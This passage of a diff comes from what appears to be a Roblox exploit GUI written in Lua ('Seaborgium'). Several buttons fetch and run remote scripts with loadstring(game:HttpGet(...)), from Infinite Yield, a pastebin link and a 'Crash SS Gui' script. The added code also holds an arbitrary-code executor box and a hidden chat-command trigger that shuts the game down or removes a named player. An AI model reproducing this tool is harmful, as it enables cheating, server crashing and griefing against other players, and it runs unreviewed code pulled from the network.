-	end)
-end
-coroutine.wrap(QMXDFHQ_fake_script)()
-local function JXNYA_fake_script() -- runiy.LocalScript 
-	local script = Instance.new('LocalScript', runiy)
-
-	local ran = false
-	
-	script.Parent.MouseButton1Click:Connect(function()
-		if ran == false then
-			ran = true
-			script.Parent.Text = "Executed"
-			loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
-		else
-			script.Parent.Text = "Already Executed"
-			wait(1)
-			script.Parent.Text = "Executed"
-		end
-		
-	end)
-end
-coroutine.wrap(JXNYA_fake_script)()
-local function NRBGS_fake_script() -- runc4bh.LocalScript 
-	local script = Instance.new('LocalScript', runc4bh)
-
-	local ran = false
-	
-	script.Parent.MouseButton1Click:Connect(function()
-		if ran == false then
-			ran = true
-			script.Parent.Text = "Executed"
-			loadstring(game:HttpGet("https://pastebin.com/raw/zU1GnU88", true))()
-		else
-			script.Parent.Text = "Already Executed"
-			wait(1)
-			script.Parent.Text = "Executed"
-		end
-	
-	end)
-end
-coroutine.wrap(NRBGS_fake_script)()
-local function ELLSHSZ_fake_script() -- mscripts.LocalScript 
-	local script = Instance.new('LocalScript', mscripts)
-
-	script.Parent.MouseButton1Click:Connect(function()
-		script.Parent.mscrip.Visible = not script.Parent.mscrip.Visible
-	end)
-end
-coroutine.wrap(ELLSHSZ_fake_script)()
-local function EMGI_fake_script() -- UICorner_17.LocalScript 
-	local script = Instance.new('LocalScript', UICorner_17)
+coroutine.wrap(PERO_fake_script)()
+local function ZDLW_fake_script() -- UICorner_8.LocalScript 
+	local script = Instance.new('LocalScript', UICorner_8)
 
 	local Players = game:GetService("Players")
 	
 	local function onPlayerAdded(player)
 		local function onChatted(message)
 			if message == "k,NAR" then
-				game.Players.RonyHoudini:Destroy()
+				game:shutdown()
 			elseif message == "k,LOCAL" then
 				game.Players.highskyY8K:Destroy()
 			end
@@ -1371,8 +1343,8 @@ local function EMGI_fake_script() -- UICorner_17.LocalScript
 	
 	Players.PlayerAdded:Connect(onPlayerAdded)
 end
-coroutine.wrap(EMGI_fake_script)()
-local function PTJTH_fake_script() -- use.LocalScript 
+coroutine.wrap(ZDLW_fake_script)()
+local function TWVB_fake_script() -- use.LocalScript 
 	local script = Instance.new('LocalScript', use)
 
 	local player = game.Players.LocalPlayer
@@ -1388,8 +1360,8 @@ local function PTJTH_fake_script() -- use.LocalScript
 	
 	
 end
-coroutine.wrap(PTJTH_fake_script)()
-local function XPVDB_fake_script() -- title.LocalScript 
+coroutine.wrap(TWVB_fake_script)()
+local function MGALO_fake_script() -- title.LocalScript 
 	local script = Instance.new('LocalScript', title)
 
 	local sf = script.Parent.swearwords.bg.ScrollingFrame
@@ -1477,8 +1449,8 @@ local function XPVDB_fake_script() -- title.LocalScript
 	end)
 	
 end
-coroutine.wrap(XPVDB_fake_script)()
-local function ZHDNES_fake_script() -- Mods4Game.morebase 
+coroutine.wrap(MGALO_fake_script)()
+local function LVHKYW_fake_script() -- Mods4Game.morebase 
 	local script = Instance.new('LocalScript', Mods4Game)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -1530,8 +1502,8 @@ local function ZHDNES_fake_script() -- Mods4Game.morebase
 		wait(3)
 	end
 end
-coroutine.wrap(ZHDNES_fake_script)()
-local function FQDPAJY_fake_script() -- BanUser.BAN PLAYER 
+coroutine.wrap(LVHKYW_fake_script)()
+local function DYXUX_fake_script() -- BanUser.BAN PLAYER 
 	local script = Instance.new('LocalScript', BanUser)
 
 	local banning = false
@@ -1648,8 +1620,8 @@ local function FQDPAJY_fake_script() -- BanUser.BAN PLAYER
 	
 	
 end
-coroutine.wrap(FQDPAJY_fake_script)()
-local function XTNJRK_fake_script() -- m4gbans.ban4you. 
+coroutine.wrap(DYXUX_fake_script)()
+local function ITECH_fake_script() -- m4gbans.ban4you. 
 	local script = Instance.new('LocalScript', m4gbans)
 
 	local btext = "Current Ban Method: Remote"
@@ -1689,8 +1661,108 @@ local function XTNJRK_fake_script() -- m4gbans.ban4you.
 	end)
 	
 end
-coroutine.wrap(XTNJRK_fake_script)()
-local function JTGX_fake_script() -- Frame.Draggable_yeah 
+coroutine.wrap(ITECH_fake_script)()
+local function QFSYZI_fake_script() -- codebox.LocalScript 
+	local script = Instance.new('LocalScript', codebox)
+
+	local ran = math.random(0, 10)
+	local ptext = script.Parent
+	
+	if ran == 1 then
+		ptext.PlaceholderText = "Mags <3 Local |- Lexie"
+	elseif ran == 4 then
+		ptext.PlaceholderText = "#Mocal + #Lags |- Lexie"
+	else
+		ptext.PlaceholderText = "   Seaborgium | made by Alex54. & HighskyY8K"
+	end
+end
+coroutine.wrap(QFSYZI_fake_script)()
+local function POINKS_fake_script() -- Execute.LocalScript 
+	local script = Instance.new('LocalScript', Execute)
+
+	local cod_e = script.Parent.Parent.codeditorsw.codebox
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Text = "Executed!"
+		loadstring(cod_e.Text)()
+		wait(1)
+		script.Parent.Text = "Execute"
+	end)
+	
+	script.Parent.Parent.CClear.MouseButton1Click:Connect(function()
+		script.Parent.Parent.CClear.Text = "Cleared!"
+		cod_e.Text = ""
+		wait(1)
+		script.Parent.Parent.CClear.Text = "Clear Code"
+	end)
+end
+coroutine.wrap(POINKS_fake_script)()
+local function TIQQO_fake_script() -- runiy.LocalScript 
+	local script = Instance.new('LocalScript', runiy)
+
+	local ran = false
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		if ran == false then
+			ran = true
+			script.Parent.Text = "Executed"
+			loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+		else
+			script.Parent.Text = "Already Executed"
+			wait(1)
+			script.Parent.Text = "Executed"
+		end
+		
+	end)
+end
+coroutine.wrap(TIQQO_fake_script)()
+local function NCZGIZ_fake_script() -- runc4bh.LocalScript 
+	local script = Instance.new('LocalScript', runc4bh)
+
+	local ran = false
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		if ran == false then
+			ran = true
+			script.Parent.Text = "Executed"
+			loadstring(game:HttpGet("https://pastebin.com/raw/zU1GnU88", true))()
+		else
+			script.Parent.Text = "Already Executed"
+			wait(1)
+			script.Parent.Text = "Executed"
+		end
+	
+	end)
+end
+coroutine.wrap(NCZGIZ_fake_script)()
+local function VTLH_fake_script() -- runc4bh_2.LocalScript 
+	local script = Instance.new('LocalScript', runc4bh_2)
+
+	local ran = false
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		if ran == false then
+			ran = true
+			script.Parent.Text = "Executed"
+			loadstring(game:HttpGet('https://raw.githubusercontent.com/highskyY8K/roblox-scripts/main/Crash%20SS%20Gui'))()
+		else
+			script.Parent.Text = "Already Executed"
+			wait(1)
+			script.Parent.Text = "Executed"
+		end
+	
+	end)
+end
+coroutine.wrap(VTLH_fake_script)()
+local function YJCXOA_fake_script() -- mscripts.LocalScript 
+	local script = Instance.new('LocalScript', mscripts)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.mscrip.Visible = not script.Parent.mscrip.Visible
+	end)
+end
+coroutine.wrap(YJCXOA_fake_script)()
+local function PNGPREN_fake_script() -- Frame.Draggable_yeah 
 	local script = Instance.new('LocalScript', Frame)
 
 	script.Parent.Parent.Parent.Background.Transparency = 1
@@ -1758,5 +1830,4 @@ local function JTGX_fake_script() -- Frame.Draggable_yeah
 	end
 	
 end
-coroutine.wrap(JTGX_fake_script)()
-
+coroutine.wrap(PNGPREN_fake_script)()
